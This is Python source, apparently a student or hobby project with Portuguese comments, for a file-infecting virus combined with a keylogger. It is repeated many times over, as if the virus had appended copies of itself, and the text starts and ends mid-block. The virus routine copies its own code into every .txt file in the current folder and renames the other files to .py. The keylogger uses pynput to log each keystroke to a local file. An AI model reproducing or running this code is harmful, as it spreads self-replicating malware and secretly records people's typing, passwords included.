    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

